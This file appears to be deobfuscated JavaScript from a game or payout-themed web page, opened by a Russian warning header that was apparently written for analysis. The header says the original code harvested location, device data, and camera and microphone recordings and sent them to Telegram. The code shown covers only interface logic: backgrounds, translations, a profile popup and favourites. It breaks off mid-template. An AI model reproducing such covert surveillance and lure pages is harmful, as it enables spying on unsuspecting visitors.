/*
 * ==========================================================================
 * !!! ПРЕДУПРЕЖДЕНИЕ: ОПАСНЫЙ КОД (РАСШИФРОВАННЫЙ) !!!
 * ==========================================================================
 * Этот код был деобфусцирован для анализа.
 * ОРИГИНАЛЬНЫЙ КОД ПРЕДНАЗНАЧЕН ДЛЯ СБОРА ДАННЫХ, ВКЛЮЧАЯ:
 *  - IP-адрес и геолокацию
 *  - Информацию о браузере и устройстве
 *  - ДОСТУП К КАМЕРЕ И МИКРОФОНУ (делает фото, записывает аудио)
 * Все собранные данные ОТПРАВЛЯЮТСЯ в Telegram через СКОМПРОМЕТИРОВАННЫЙ ТОКЕН.
 *
 * НЕ ЗАПУСКАЙТЕ ЭТОТ КОД, ЕСЛИ ВЫ НЕ ПОНИМАЕТЕ ПОЛНОСТЬЮ ЕГО ДЕЙСТВИЙ!
 * НЕ ИСПОЛЬЗУЙТЕ ОРИГИНАЛЬНЫЙ ТОКЕН TELEGRAM ИЗ ОБФУСЦИРОВАННОГО КОДА!
 * ==========================================================================
 */

// --- Начало расшифрованного кода ---

// Функция для создания анимированных звезд на фоне
function createStars() {
    const starsContainer = document.getElementById('stars'); // Получаем контейнер для звезд
    if (!starsContainer) {
        console.warn("Элемент с ID 'stars' не найден. Звезды не будут созданы.");
        return; // Выходим, если контейнера нет
    }

    // Создаем 150 звезд
    for (let i = 0; i < 150; i++) {
        const starElement = document.createElement('div'); // Создаем элемент div для звезды
        starElement.className = 'star'; // Присваиваем класс 'star' для стилизации

        // Генерируем случайные параметры для звезды
        const x = Math.random() * 100; // Позиция по горизонтали (в процентах)
        const y = Math.random() * 100; // Позиция по вертикали (в процентах)
        const size = Math.random() * 3 + 1; // Размер звезды от 1 до 4 пикселей
        const animationDelay = Math.random() * 5; // Задержка анимации до 5 секунд

        // Применяем стили к элементу звезды
        starElement.style.left = x + '%';
        starElement.style.top = y + '%';
        starElement.style.width = size + 'px';
        starElement.style.height = size + 'px';

        // Устанавливаем CSS переменные для анимации (используются в CSS)
        starElement.style.setProperty('--duration', animationDelay + 's'); // Продолжительность/задержка
        // Случайное смещение для эффекта "дрожания"
        const dx = (Math.random() * 4 - 2).toFixed(2) + 'px'; // Смещение по X (-2px до +2px)
        const dy = (Math.random() * 4 - 2).toFixed(2) + 'px'; // Смещение по Y (-2px до +2px)
        starElement.style.setProperty('--dx', dx); // Переменная для смещения по X
        starElement.style.setProperty('--dy', dy); // Переменная для смещения по Y

        // Добавляем созданную звезду в контейнер
        starsContainer.appendChild(starElement);
    }
}

// Функция для переключения видимости выпадающего меню бота
function toggleBotMenu() {
    const botDropdown = document.getElementById('bot-dropdown');
    if (botDropdown) { // Проверяем, найден ли элемент
        botDropdown.classList.toggle('show'); // Переключаем класс 'show'
    } else {
        console.warn("Элемент 'bot-dropdown' не найден.");
    }
}

// Функция для переключения видимости выпадающего меню выбора языка
function toggleLangMenu() {
    const langOptions = document.getElementById('lang-options');
    if (langOptions) { // Проверяем, найден ли элемент
        langOptions.classList.toggle('show'); // Переключаем класс 'show'
    } else {
        console.warn("Элемент 'lang-options' не найден.");
    }
}

// Переводы названий устройств для разных языков
const deviceTranslations = {
    'pc': { 'ru': 'ПК', 'en': 'PC', 'hi': 'पीसी', 'br': 'PC', 'es': 'PC', 'uz': 'PK', 'az': 'PC', 'tr': 'PC', 'pt': 'PC', 'ar': 'كمبيوتر' },
    'android': { 'ru': 'Андроид', 'en': 'Android', 'hi': 'एन्ड्रोयड', 'br': 'Android', 'es': 'Android', 'uz': 'Android', 'az': 'Android', 'tr': 'Android', 'pt': 'Android', 'ar': 'أندرويد' },
    'ios': { 'ru': 'iOS', 'en': 'iOS', 'hi': 'आईओएस', 'br': 'iOS', 'es': 'iOS', 'uz': 'iOS', 'az': 'iOS', 'tr': 'iOS', 'pt': 'iOS', 'ar': 'آيفون' }
};

// Переводы текстов интерфейса для разных языков
const botMenuTranslations = {
    'ru': { 'lang': '🌐 Язык', 'profile': '👤 Профиль', 'settings': '⚙️ Настройки' },
    'en': { 'lang': '🌐 Language', 'profile': '👤 Profile', 'settings': '⚙️ Settings' },
    'hi': { 'lang': '🌐 भाषा', 'profile': '👤 प्रोफ़ाइल', 'settings': '⚙️ सेटिंग्स' }, // Хинди
    'br': { 'lang': '🌐 Idioma', 'profile': '👤 Perfil', 'settings': '⚙️ Configurações' }, // Бразильский португальский
    'es': { 'lang': '🌐 Idioma', 'profile': '👤 Perfil', 'settings': '⚙️ Ajustes' }, // Испанский
    'uz': { 'lang': '🌐 Til', 'profile': '👤 Profil', 'settings': '⚙️ Sozlamalar' }, // Узбекский
    'az': { 'lang': '🌐 Dil', 'profile': '👤 Profil', 'settings': '⚙️ Ayarlar' }, // Азербайджанский
    'tr': { 'lang': '🌐 Dil', 'profile': '👤 Profil', 'settings': '⚙️ Ayarlar' }, // Турецкий
    'pt': { 'lang': '🌐 Idioma', 'profile': '👤 Perfil', 'settings': '⚙️ Configurações' }, // Португальский
    'ar': { 'lang': '🌐 اللغة', 'profile': '👤 الملف الشخصي', 'settings': '⚙️ الإعدادات' } // Арабский
};
const settingsTranslations = {
    'ru': { 'glow': ['🔆 Выключить сияние', '🔆 Включить сияние'], 'stars': ['✨ Выключить фон', '✨ Включить фон'], 'bgStyle': '🌌 Сменить фон', 'title': '⚙️ Настройки', 'close': 'Закрыть' },
    'en': { 'glow': ['🔆 Disable glow', '🔆 Enable glow'], 'stars': ['✨ Disable background', '✨ Enable background'], 'bgStyle': '🌌 Switch background', 'title': '⚙️ Settings', 'close': 'Close' },
    'hi': { 'glow': ['🔆 चमक बंद करें', '🔆 चमक चालू करें'], 'stars': ['✨ पृष्ठभूमि बंद करें', '✨ पृष्ठभूमि चालू करें'], 'bgStyle': '🌌 पृष्ठभूमि बदलें', 'title': '⚙️ सेटिंग्स', 'close': 'बंद करें' },
    'br': { 'glow': ['🔆 Desativar brilho', '🔆 Ativar brilho'], 'stars': ['✨ Desativar fundo', '✨ Ativar fundo'], 'bgStyle': '🌌 Mudar fundo', 'title': '⚙️ Configurações', 'close': 'Fechar' },
    'es': { 'glow': ['🔆 Desactivar brillo', '🔆 Activar brillo'], 'stars': ['✨ Desactivar fondo', '✨ Activar fondo'], 'bgStyle': '🌌 Cambiar fondo', 'title': '⚙️ Ajustes', 'close': 'Cerrar' },
    'uz': { 'glow': ['🔆 Yaltirashni oʻchirish', '🔆 Yaltirashni yoqish'], 'stars': ['✨ Fonni oʻchirish', '✨ Fonni yoqish'], 'bgStyle': '🌌 Fonni oʻzgartirish', 'title': '⚙️ Sozlamalar', 'close': 'Yopish' },
    'az': { 'glow': ['🔆 Parıltını söndür', '🔆 Parıltını aktivləşdir'], 'stars': ['✨ Fonu söndür', '✨ Fonu aktivləşdir'], 'bgStyle': '🌌 Fonu dəyişdir', 'title': '⚙️ Ayarlar', 'close': 'Bağla' },
    'tr': { 'glow': ['🔆 Parlamayı kapat', '🔆 Parlamayı aç'], 'stars': ['✨ Arka planı kapat', '✨ Arka planı aç'], 'bgStyle': '🌌 Arka planı değiştir', 'title': '⚙️ Ayarlar', 'close': 'Kapat' },
    'pt': { 'glow': ['🔆 Desativar brilho', '🔆 Ativar brilho'], 'stars': ['✨ Desativar fundo', '✨ Ativar fundo'], 'bgStyle': '🌌 Mudar fundo', 'title': '⚙️ Configurações', 'close': 'Fechar' },
    'ar': { 'glow': ['🔆 إيقاف التوهج', '🔆 تشغيل التوهج'], 'stars': ['✨ إيقاف الخلفية', '✨ تشغيل الخلفية'], 'bgStyle': '🌌 تغيير الخلفية', 'title': '⚙️ الإعدادات', 'close': 'إغلاق' }
};
const profileTranslations = {
    'ru': { 'title': '👤 Профиль', 'nicknameLabel': 'Никнейм:', 'placeholder': 'Введите никнейм', 'save': 'Сохранить', 'nickname': 'Ваш никнейм:', 'status': 'Статус аккаунта:', 'chance': 'Шанс выдачи:', 'statusValue': 'Неизвестно', 'close': 'Закрыть' },
    'en': { 'title': '👤 Profile', 'nicknameLabel': 'Nickname:', 'placeholder': 'Enter nickname', 'save': 'Save', 'nickname': 'Your nickname:', 'status': 'Account Status:', 'chance': 'Payout Chance:', 'statusValue': 'Unknown', 'close': 'Close' },
    'hi': { 'title': '👤 प्रोफ़ाइल', 'nicknameLabel': 'उपनाम:', 'placeholder': 'उपनाम दर्ज करें', 'save': 'सहेजें', 'nickname': 'आपका उपनाम:', 'status': 'खाता स्थिति:', 'chance': 'वितरण संभावना:', 'statusValue': 'अज्ञात', 'close': 'बंद करें' },
    'br': { 'title': '👤 Perfil', 'nicknameLabel': 'Apelido:', 'placeholder': 'Insira o apelido', 'save': 'Salvar', 'nickname': 'Seu apelido:', 'status': 'Estado da conta:', 'chance': 'Chance de saque:', 'statusValue': 'Desconhecido', 'close': 'Fechar' },
    'es': { 'title': '👤 Perfil', 'nicknameLabel': 'Apodo:', 'placeholder': 'Introduce el apodo', 'save': 'Guardar', 'nickname': 'Tu apodo:', 'status': 'Estado de la cuenta:', 'chance': 'Probabilidad de pago:', 'statusValue': 'Desconocido', 'close': 'Cerrar' },
    'uz': { 'title': '👤 Profil', 'nicknameLabel': 'Taxallus:', 'placeholder': 'Taxallusingizni kiriting', 'save': 'Saqlash', 'nickname': 'Sizning taxallusingiz:', 'status': 'Hisob holati:', 'chance': 'Toʻlov imkoniyati:', 'statusValue': 'Nomaʼlum', 'close': 'Yopish' },
    'az': { 'title': '👤 Profil', 'nicknameLabel': 'Ləqəb:', 'placeholder': 'Ləqəbi daxil edin', 'save': 'Yadda saxla', 'nickname': 'Sizin ləqəbiniz:', 'status': 'Hesab statusu:', 'chance': 'Ödəniş ehtimalı:', 'statusValue': 'Naməlum', 'close': 'Bağla' },
    'tr': { 'title': '👤 Profil', 'nicknameLabel': 'Takma ad:', 'placeholder': 'Takma adınızı girin', 'save': 'Kaydet', 'nickname': 'Takma adınız:', 'status': 'Hesap durumu:', 'chance': 'Ödeme şansı:', 'statusValue': 'Bilinmiyor', 'close': 'Kapat' },
    'pt': { 'title': '👤 Perfil', 'nicknameLabel': 'Apelido:', 'placeholder': 'Digite o apelido', 'save': 'Salvar', 'nickname': 'Seu apelido:', 'status': 'Status da conta:', 'chance': 'Chance de pagamento:', 'statusValue': 'Desconhecido', 'close': 'Fechar' },
    'ar': { 'title': '👤 الملف الشخصي', 'nicknameLabel': 'الاسم المستعار:', 'placeholder': 'أدخل الاسم المستعار', 'save': 'حفظ', 'nickname': 'اسمك المستعار:', 'status': 'حالة الحساب:', 'chance': 'فرصة السحب:', 'statusValue': 'غير معروف', 'close': 'إغلاق' }
};


// Функция для смены языка интерфейса
function switchLanguage(langCode) {
    // Устанавливаем язык для тега <html>
    document.documentElement.lang = langCode;

    // Скрываем меню выбора языка, если оно было открыто
    const langOptions = document.getElementById('lang-options');
    if (langOptions) {
        langOptions.classList.remove('show');
    }

    // Обновляем список языков в выпадающем меню
    const langOptionsContainer = document.getElementById('lang-options');
    if (langOptionsContainer) {
        langOptionsContainer.innerHTML = ''; // Очищаем текущий список

        // Список всех языков (можно вынести в константу)
        const languages = [
            { code: 'ru', name: 'RU', file: 'ru' }, { code: 'en', name: 'EN', file: 'en' },
            { code: 'hi', name: 'हिन्दी (HI)', file: 'hi' }, { code: 'br', name: 'PT-BR', file: 'br' },
            { code: 'es', name: 'ES', file: 'es' }, { code: 'uz', name: 'UZ', file: 'uz' },
            { code: 'az', name: 'AZ', file: 'az' }, { code: 'tr', name: 'TR', file: 'tr' },
            { code: 'pt', name: 'PT', file: 'pt' }, { code: 'ar', name: 'العربية', file: 'ar' }
        ];

        // Добавляем опции для ДРУГИХ языков
        const otherLanguages = languages.filter(lang => lang.code !== langCode);
        otherLanguages.forEach(lang => {
            // Путь к картинкам флагов, возможно, неверен
            const flagPath = `flags/${lang.file}.png`;
            langOptionsContainer.innerHTML += `
                <div class="lang-option" data-lang="${lang.code}" onclick="switchLanguage('${lang.code}')">
                    <img src="${flagPath}" alt="${lang.name}" class="lang-flag" onerror="this.style.display='none'"> <!-- Скрываем, если флаг не найден -->
                    <span class="lang-text">${lang.name}</span>
                </div>`;
        });
    }

    // Обновляем тексты на странице согласно выбранному языку
    updateDeviceInfo(langCode); // Обновить инфо об устройстве

    // Обновить тексты меню бота
    const botTrans = botMenuTranslations[langCode] || botMenuTranslations['en'];
    try { // Оборачиваем в try-catch на случай отсутствия элементов
        document.querySelector('.bot-item[onclick*="toggleLangMenu"] .bot-item-text').textContent = botTrans.lang;
        document.querySelector('.bot-item[onclick*="openProfile"] .bot-item-text').textContent = botTrans.profile;
        document.querySelector('.bot-item[onclick*="toggleSettingsMenu"] .bot-item-text').textContent = botTrans.settings;
    } catch (e) { console.warn("Не удалось обновить текст меню бота:", e); }

    // Обновить тексты меню настроек
    const settingsTrans = settingsTranslations[langCode] || settingsTranslations['en'];
    try {
        document.querySelector('#settings-popup .popup-title').textContent = settingsTrans.title;
        document.getElementById('toggle-glow-btn').textContent = glowEnabled ? settingsTrans.glow[0] : settingsTrans.glow[1];
        document.getElementById('toggle-stars-btn').textContent = starsEnabled ? settingsTrans.stars[0] : settingsTrans.stars[1];
        document.getElementById('toggle-bg-btn').textContent = settingsTrans.bgStyle; // ID кнопки смены фона
        document.querySelector('#settings-popup .close-popup-btn').textContent = settingsTrans.close; // Кнопка закрытия настроек
    } catch (e) { console.warn("Не удалось обновить текст меню настроек:", e); }

    // Обновить тексты профиля
    const profileTrans = profileTranslations[langCode] || profileTranslations['en'];
    try {
        document.querySelector('#profile-popup .popup-title').textContent = profileTrans.title;
        document.getElementById('nickname-label').textContent = profileTrans.nicknameLabel;
        document.getElementById('nickname-input').placeholder = profileTrans.placeholder;
        document.getElementById('save-nickname-btn').textContent = profileTrans.save;
        document.getElementById('nickname-display-label').textContent = profileTrans.nickname;
        document.getElementById('status-label').textContent = profileTrans.status;
        document.getElementById('chance-label').textContent = profileTrans.chance;
        document.getElementById('status-value').textContent = profileTrans.statusValue; // Здесь должно быть реальное значение статуса
        document.querySelector('#profile-popup .close-popup-btn').textContent = profileTrans.close; // Кнопка закрытия профиля
    } catch (e) { console.warn("Не удалось обновить текст профиля:", e); }

    // Сохраняем выбранный язык в локальное хранилище
    localStorage.setItem('selectedLanguage', langCode);
}

// Функция для определения типа устройства пользователя
function detectDevice() {
    const userAgent = navigator.userAgent.toLowerCase();
    if (userAgent.includes('android')) { return 'android'; }
    // Проверка на iPhone, iPad, iPod
    if (/iphone|ipad|ipod/.test(userAgent)) { return 'ios'; }
    // Все остальное считаем ПК
    return 'pc';
}

// Функция для обновления информации об устройстве на странице
function updateDeviceInfo(currentLangCode) {
    const deviceType = detectDevice(); // Определяем тип устройства
    const iconElement = document.getElementById('device-icon');
    const textElement = document.getElementById('device-text');

    // Выходим, если элементы не найдены
    if (!iconElement || !textElement) {
        console.warn("Элементы 'device-icon' или 'device-text' не найдены.");
        return;
    }

    let icon = '💻'; // Иконка по умолчанию для ПК
    if (deviceType === 'android' || deviceType === 'ios') {
        icon = '📱'; // Иконка для мобильных
    }

    // Получаем переведенное название устройства
    let deviceText = (deviceTranslations[deviceType] && deviceTranslations[deviceType][currentLangCode]) ||
                     (deviceTranslations[deviceType] && deviceTranslations[deviceType]['en']) || // Запасной вариант - английский
                     deviceType; // Если перевода нет, показываем код устройства

    // Обновляем содержимое элементов
    iconElement.textContent = icon;
    textElement.textContent = deviceText;
}

// Управление верхним баром (Top Bar) при прокрутке страницы
let lastScrollPosition = 0; // Позиция последней прокрутки
const topBarElement = document.getElementById('top-bar');
let isTopBarCurrentlyHidden = false; // Флаг состояния бара

if (topBarElement) { // Выполняем только если бар найден
    window.addEventListener('scroll', () => {
        const currentScrollPosition = window.pageYOffset || document.documentElement.scrollTop;

        // Закрываем меню при скролле
        const langOptions = document.getElementById('lang-options');
        if (langOptions) langOptions.classList.remove('show');
        const botDropdown = document.getElementById('bot-dropdown');
        if (botDropdown) botDropdown.classList.remove('show');

        // Определяем направление скролла и видимость бара
        if (currentScrollPosition > lastScrollPosition && currentScrollPosition > 50 && !isTopBarCurrentlyHidden) {
            // Скролл вниз, и бар еще не скрыт
            topBarElement.classList.add('hidden'); // Добавляем класс для скрытия (стили в CSS)
            isTopBarCurrentlyHidden = true;
        } else if (currentScrollPosition < lastScrollPosition && isTopBarCurrentlyHidden) {
            // Скролл вверх, и бар был скрыт
            topBarElement.classList.remove('hidden'); // Убираем класс скрытия
            isTopBarCurrentlyHidden = false;
        }

        // Обновляем последнюю позицию скролла
        lastScrollPosition = currentScrollPosition <= 0 ? 0 : currentScrollPosition; // Учитываем скролл к самому верху
    }, false); // 'false' означает обработку на фазе всплытия (стандарт)
} else {
    console.warn("Элемент 'top-bar' не найден. Скрытие при скролле не будет работать.");
}

// Закрытие открытых меню/попапов при клике вне их области
document.addEventListener('click', (event) => {
    // Функция для проверки, был ли клик вне элемента и его триггера
    const isClickOutside = (element, triggerSelector) => {
        if (!element) return false; // Если элемента нет, ничего не делаем
        const trigger = triggerSelector ? event.target.closest(triggerSelector) : null;
        // Клик был вне элемента И вне его триггера (если он указан)
        return !trigger && !element.contains(event.target);
    };

    // Закрываем меню бота
    const botDropdown = document.getElementById('bot-dropdown');
    if (isClickOutside(botDropdown, '.bot-menu-trigger')) { // '.bot-menu-trigger' - класс кнопки открытия
        botDropdown.classList.remove('show');
    }

    // Закрываем меню языка
    const langOptions = document.getElementById('lang-options');
    if (isClickOutside(langOptions, '.language-switcher')) { // '.language-switcher' - класс кнопки открытия
        langOptions.classList.remove('show');
    }

    // Закрываем попап настроек (если он открывается через display)
    const settingsPopup = document.getElementById('settings-popup');
    if (settingsPopup && settingsPopup.style.display !== 'none' && isClickOutside(settingsPopup, '.settings-trigger')) { // '.settings-trigger' - класс кнопки открытия (предполагаемый)
       closeSettings();
    }

    // Закрываем попап профиля
    const profilePopup = document.getElementById('profile-popup');
     if (profilePopup && profilePopup.style.display !== 'none' && isClickOutside(profilePopup, '.profile-trigger')) { // '.profile-trigger' - класс кнопки открытия (предполагаемый)
       closeProfile();
    }
});

// Инициализация после полной загрузки HTML-документа
document.addEventListener('DOMContentLoaded', () => {
    createStars(); // Создаем звезды при загрузке

    // Загружаем и устанавливаем язык
    const savedLanguage = localStorage.getItem('selectedLanguage') || 'ru'; // Язык по умолчанию - русский
    switchLanguage(savedLanguage); // Применяем язык ко всем элементам

    // Загружаем и применяем сохраненные настройки (сияние, фон)
    loadSettings(); // Загружает переменные glowEnabled, starsEnabled, backgroundStyle
    applyBackgroundStyle(); // Применяет видимость фона на основе настроек

    // Загружаем и отображаем избранное
    loadFavorites();

    // Тут можно добавить другие инициализационные действия
    console.log("Скрипт инициализирован. Текущий язык:", savedLanguage);
});

// Переключение видимости попапа настроек
function toggleSettingsMenu() {
    const settingsPopup = document.getElementById('settings-popup');
    if (settingsPopup) {
        // Используем 'flex', если попап центрируется через flexbox
        const currentDisplay = window.getComputedStyle(settingsPopup).display;
        settingsPopup.style.display = (currentDisplay === 'none') ? 'flex' : 'none';
    } else {
         console.warn("Элемент 'settings-popup' не найден.");
    }
}

// Закрытие попапа настроек
function closeSettings() {
    const settingsPopup = document.getElementById('settings-popup');
    if (settingsPopup) {
        settingsPopup.style.display = 'none';
    }
}

// Глобальные переменные для состояния настроек (загружаются в loadSettings)
let glowEnabled = true;
let starsEnabled = true;
let backgroundStyle = 'stars'; // Возможные значения: 'stars', 'particles'

// Загрузка и применение настроек из localStorage при старте
function loadSettings() {
    // Получаем значения из localStorage, используем 'true' по умолчанию, если записи нет или она некорректна
    // Сравниваем именно со строкой 'false', так как localStorage хранит строки
    glowEnabled = localStorage.getItem('glowEnabled') !== 'false';
    starsEnabled = localStorage.getItem('starsEnabled') !== 'false';
    backgroundStyle = localStorage.getItem('bgStyle') || 'stars'; // 'stars' по умолчанию

    // Обновляем текст кнопок в меню настроек в соответствии с загруженными значениями
    const currentLang = document.documentElement.lang || 'ru';
    const settingsTrans = settingsTranslations[currentLang] || settingsTranslations['en'];

    try { // Оборачиваем в try-catch
        const toggleGlowBtn = document.getElementById('toggle-glow-btn');
        if (toggleGlowBtn) toggleGlowBtn.textContent = glowEnabled ? settingsTrans.glow[0] : settingsTrans.glow[1];

        const toggleStarsBtn = document.getElementById('toggle-stars-btn');
        if (toggleStarsBtn) toggleStarsBtn.textContent = starsEnabled ? settingsTrans.stars[0] : settingsTrans.stars[1];
    } catch (e) {
        console.warn("Не удалось обновить текст кнопок настроек при загрузке:", e);
    }

    // Применяем эффект свечения при загрузке
    applyGlowEffect();
}

// Функция для применения/снятия эффекта свечения
function applyGlowEffect() {
    // Селектор элементов, к которым применяется свечение
    const elementsToGlow = document.querySelectorAll('.game-card, .top-bar, .profile-popup, .settings-popup, .bot-item, .play-button'); // Добавлены еще элементы
    elementsToGlow.forEach(el => {
        // Простой способ - через стиль animation. Лучше - через классы.
        if (glowEnabled) {
            // Убедимся, что нет конфликтующих анимаций
            el.style.animation = 'glowing 1.5s ease-in-out infinite';
        } else {
            el.style.animation = 'none';
        }
        // Пример с классами (предполагает наличие стилей для .effect-glow):
        // el.classList.toggle('effect-glow', glowEnabled);
    });
}

// Функция переключения эффекта свечения
function toggleGlow() {
    glowEnabled = !glowEnabled; // Инвертируем состояние
    localStorage.setItem('glowEnabled', glowEnabled); // Сохраняем в localStorage
    loadSettings(); // Обновляем текст кнопки настроек
    applyGlowEffect(); // Применяем/убираем эффект
    console.log("Эффект свечения:", glowEnabled ? "Включен" : "Выключен");
}

// Функция переключения видимости фона (звезд/частиц)
function toggleStars() {
    starsEnabled = !starsEnabled; // Инвертируем состояние
    localStorage.setItem('starsEnabled', starsEnabled); // Сохраняем
    loadSettings(); // Обновляем текст кнопки
    applyBackgroundStyle(); // Применяем/скрываем фон
    console.log("Отображение фона:", starsEnabled ? "Включено" : "Выключено");
}

// Функция переключения стиля фона (между звездами и частицами)
function toggleBackgroundStyle() {
    backgroundStyle = (backgroundStyle === 'stars') ? 'particles' : 'stars'; // Переключаем тип
    localStorage.setItem('bgStyle', backgroundStyle); // Сохраняем
    applyBackgroundStyle(); // Применяем новый стиль фона
    console.log("Стиль фона изменен на:", backgroundStyle);
}

// Применяет выбранный стиль фона и его видимость
function applyBackgroundStyle() {
    const starsContainer = document.getElementById('stars');
    let particlesContainer = document.getElementById('particles'); // Ищем контейнер частиц

    // Если выбран стиль "частицы" и контейнера нет, создаем его
    if (backgroundStyle === 'particles' && !particlesContainer) {
        particlesContainer = document.createElement('div');
        particlesContainer.id = 'particles';
        // Добавляем его в начало body, чтобы он был под остальным контентом
        document.body.insertBefore(particlesContainer, document.body.firstChild);
        generateParticles(particlesContainer); // Генерируем частицы один раз при создании
    }

    // Устанавливаем видимость контейнеров в зависимости от настроек
    if (starsContainer) {
        starsContainer.style.display = (backgroundStyle === 'stars' && starsEnabled) ? 'block' : 'none';
    }
    if (particlesContainer) {
        particlesContainer.style.display = (backgroundStyle === 'particles' && starsEnabled) ? 'block' : 'none';
    }

    // Обновляем текст кнопки смены фона в настройках
    try {
        const currentLang = document.documentElement.lang || 'ru';
        const settingsTrans = settingsTranslations[currentLang] || settingsTranslations['en'];
        const toggleBgBtn = document.getElementById('toggle-bg-btn');
        if (toggleBgBtn) toggleBgBtn.textContent = settingsTrans.bgStyle;
    } catch (e) {
        console.warn("Не удалось обновить текст кнопки смены фона:", e);
    }
}


// Генерация анимированных частиц (альтернатива звездам)
function generateParticles(container) {
    if (!container) {
        console.warn("Контейнер для частиц не найден.");
        return;
    }
    container.innerHTML = ''; // Очищаем на случай повторного вызова

    // Создаем 50 частиц (можно настроить количество)
    for (let i = 0; i < 50; i++) {
        const particle = document.createElement('div');
        particle.className = 'particle'; // Класс для стилизации частиц

        // Случайные параметры
        const x = Math.random() * 100;
        const y = Math.random() * 100;
        const size = Math.random() * 2 + 1; // Размер 1-3px
        const animationDuration = Math.random() * 5 + 5; // Длительность анимации 5-10с
        const animationDelay = Math.random() * 5; // Задержка старта анимации до 5с

        // Применяем стили
        particle.style.left = x + '%';
        particle.style.top = y + '%';
        particle.style.width = size + 'px';
        particle.style.height = size + 'px';
        // Используем стандартные свойства CSS для анимации (предполагается наличие @keyframes в CSS)
        particle.style.animationName = 'particleAnimation'; // Имя анимации из CSS
        particle.style.animationDuration = animationDuration + 's';
        particle.style.animationDelay = animationDelay + 's';
        particle.style.animationIterationCount = 'infinite';
        particle.style.animationTimingFunction = 'linear';

        container.appendChild(particle);
    }
}


// Открытие попапа профиля пользователя
function openProfile() {
    const profilePopup = document.getElementById('profile-popup');
    if (!profilePopup) {
        console.warn("Элемент 'profile-popup' не найден.");
        return;
    }

    // Получаем сохраненный никнейм
    const nickname = localStorage.getItem('nickname');

    // Находим элементы внутри попапа
    const nicknameDisplayDiv = document.getElementById('nickname-display'); // Блок для показа ника
    const nicknameInputDiv = document.getElementById('nickname-input-div'); // Блок для ввода ника
    const nicknameValueSpan = document.getElementById('nickname-value'); // Span для текста ника
    const nicknameInputElement = document.getElementById('nickname-input'); // Поле ввода

    // Проверяем, найдены ли все элементы
    if (!nicknameDisplayDiv || !nicknameInputDiv || !nicknameValueSpan || !nicknameInputElement) {
        console.warn("Не все элементы внутри 'profile-popup' найдены.");
        return;
    }

    // Показываем либо блок с ником, либо блок для ввода
    if (nickname) {
        nicknameDisplayDiv.style.display = 'block'; // Показываем блок с ником
        nicknameInputDiv.style.display = 'none';  // Скрываем блок ввода
        nicknameValueSpan.textContent = nickname; // Вставляем ник
    } else {
        nicknameDisplayDiv.style.display = 'none';   // Скрываем блок с ником
        nicknameInputDiv.style.display = 'block';  // Показываем блок ввода
        nicknameInputElement.value = ''; // Очищаем поле ввода на всякий случай
    }

    // Показываем сам попап (используем 'flex' для центрирования)
    profilePopup.style.display = 'flex';
}

// Сохранение никнейма из поля ввода
function saveNickname() {
    const inputElement = document.getElementById('nickname-input');
    if (!inputElement) {
         console.warn("Элемент 'nickname-input' не найден.");
         return;
    }

    const nickname = inputElement.value.trim(); // Получаем значение и убираем пробелы по краям

    if (nickname) { // Если никнейм не пустой
        localStorage.setItem('nickname', nickname); // Сохраняем в localStorage
        openProfile(); // Переоткрываем (или обновляем) попап профиля, чтобы показать сохраненный ник
        // Можно добавить уведомление об успехе
        alert("Никнейм сохранен!"); // Простое уведомление
    } else {
        // Сообщаем пользователю, что никнейм не может быть пустым
        alert("Никнейм не может быть пустым!");
    }
}

// Закрытие попапа профиля
function closeProfile() {
    const profilePopup = document.getElementById('profile-popup');
    if (profilePopup) {
        profilePopup.style.display = 'none'; // Скрываем попап
    }
}

// Переключение состояния "Избранное" для элемента (например, игры)
function toggleFavorite(event, heartIconElement) {
    event.stopPropagation(); // Останавливаем всплытие события, чтобы не сработали другие клики

    // Находим родительский элемент .game-card, содержащий все данные
    const gameCard = heartIconElement.closest('.game-card');
    if (!gameCard) {
        console.warn("Не найден родительский элемент '.game-card' для иконки избранного.");
        return;
    }

    // Получаем данные игры из data-атрибутов карточки
    const name = gameCard.getAttribute('data-name');
    const image = gameCard.getAttribute('data-image');
    const link = gameCard.getAttribute('data-link');

    // Проверяем, все ли данные есть
    if (!name || !image || !link) {
        console.warn("Отсутствуют data-атрибуты (name, image, link) на элементе '.game-card'.");
        return;
    }

    // Получаем текущий список избранного из localStorage
    let favorites = [];
    try {
        favorites = JSON.parse(localStorage.getItem('favorites') || '[]');
        if (!Array.isArray(favorites)) favorites = []; // Если там не массив, сбрасываем
    } catch (e) {
        console.error("Ошибка чтения 'favorites' из localStorage:", e);
        favorites = []; // Сбрасываем при ошибке
    }


    // Ищем, есть ли уже этот элемент в избранном
    const existingIndex = favorites.findIndex(fav => fav.name === name);

    if (existingIndex > -1) {
        // Элемент найден -> Удаляем из избранного
        favorites.splice(existingIndex, 1); // Удаляем элемент из массива
        heartIconElement.classList.remove('active'); // Убираем активный класс у иконки
        heartIconElement.textContent = '🤍'; // Меняем иконку на неактивную (пример)
        console.log(`"${name}" удалено из избранного.`);
    } else {
        // Элемент не найден -> Добавляем в избранное
        favorites.push({ name, image, link }); // Добавляем объект в массив
        heartIconElement.classList.add('active'); // Добавляем активный класс иконке
        heartIconElement.textContent = '❤️'; // Меняем иконку на активную (пример)
        console.log(`"${name}" добавлено в избранное.`);
    }

    // Сохраняем обновленный массив обратно в localStorage
    try {
        localStorage.setItem('favorites', JSON.stringify(favorites));
    } catch (e) {
         console.error("Ошибка сохранения 'favorites' в localStorage:", e);
    }


    // Опционально: обновить видимый список избранного немедленно
    // loadFavorites();
}

// Загрузка и отображение списка избранного
function loadFavorites() {
    const favoritesContainer = document.getElementById('favorites-container');
    if (!favoritesContainer) {
        // console.warn("Элемент 'favorites-container' не найден. Избранное не будет загружено.");
        return; // Если контейнера нет, ничего не делаем
    }

    let favorites = [];
    try {
        favorites = JSON.parse(localStorage.getItem('favorites') || '[]');
        if (!Array.isArray(favorites)) favorites = [];
    } catch (e) {
         console.error("Ошибка чтения 'favorites' из localStorage при загрузке:", e);
         favorites = [];
    }


    favoritesContainer.innerHTML = ''; // Очищаем контейнер перед заполнением

    if (favorites.length === 0) {
        // Если избранного нет, показываем сообщение
        favoritesContainer.innerHTML = '<p style="text-align: center; color: grey;">Список избранного пуст.</p>';
        return;
    }

    // Отображаем каждый элемент избранного
    favorites.forEach(fav => {
        const favElement = document.createElement('div');
        // Используем те же классы, что и для обычных карточек игр + доп. класс
        favElement.className = 'game-card favorite-item'; // Добавляем класс favorite-item
        // Устанавливаем data-атрибуты для работы toggleFavorite
        favElement.setAttribute('data-name', fav.name);
        favElement.setAttribute('data-image', fav.image);
        favElement.setAttribute('data-link', fav.link);

        // Генерируем HTML для элемента избранного
        // Иконка сердца должна быть 'active' и '❤️'
        favElement.innerHTML = `
            <div class="game-image-container">
